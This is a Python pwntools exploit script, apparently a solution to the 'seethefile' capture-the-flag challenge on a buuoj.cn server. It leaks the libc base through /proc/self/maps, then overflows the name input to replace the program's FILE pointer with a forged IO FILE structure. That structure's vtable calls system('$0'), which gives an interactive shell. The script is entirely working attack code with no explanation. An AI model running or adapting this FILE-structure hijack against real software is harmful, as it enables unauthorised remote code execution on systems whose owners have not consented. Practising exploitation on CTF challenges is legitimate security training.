#coding=utf8
from pwn import *
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']
 
local = 0
 
if local:
	cn = process('./seethefile')
	bin = ELF('./seethefile')
	#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
	libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
else:
	cn = remote("node3.buuoj.cn",28936)
	bin = ELF('./seethefile')
	libc = ELF('../../i386libc/x86_libc.so.6')
 
 
def z(a=''):
	gdb.attach(cn,a)
	if a == '':
		raw_input()
 
def openfile(name):
    cn.recvuntil('Your choice :')
    cn.sendline('1')
    cn.recvuntil('to see :')
    cn.sendline(name)
 
 
def readfile():
    cn.recvuntil('Your choice :')
    cn.sendline('2')
 
def writefile():
    cn.recvuntil('Your choice :')
    cn.sendline('3')
 
def closefile():
    cn.recvuntil('Your choice :')
    cn.sendline('4')
 
def exit(name):
    cn.recvuntil('Your choice :')
    cn.sendline('5')
    cn.recvuntil('your name :')
    cn.sendline(name)
 
openfile('/proc/self/maps')
readfile()
writefile()
cn.recvline()
cn.recvline()
cn.recvline()
cn.recvline()
libc.address = int(cn.recvline()[:8],16)+0x1000
print 'offset: '+hex(libc.address)
system_addr=libc.symbols['system']
print 'system: '+hex(system_addr)
closefile()
 
openfile('/proc/self/maps')
#spare place
addr=0x0804B300
payload=''
#padding+change *fp
payload+='a'*32 + p32(addr)
payload+='\x00'*(0x80-4)
#fake IO file
#flag+code
payload+='\xff\xff\xdf\xff;$0\x00'.ljust(0x94,'\x00')
#change vtable
payload+=p32(addr+0x98)
payload+=p32(system_addr)*21
exit(payload)
 
cn.interactive()
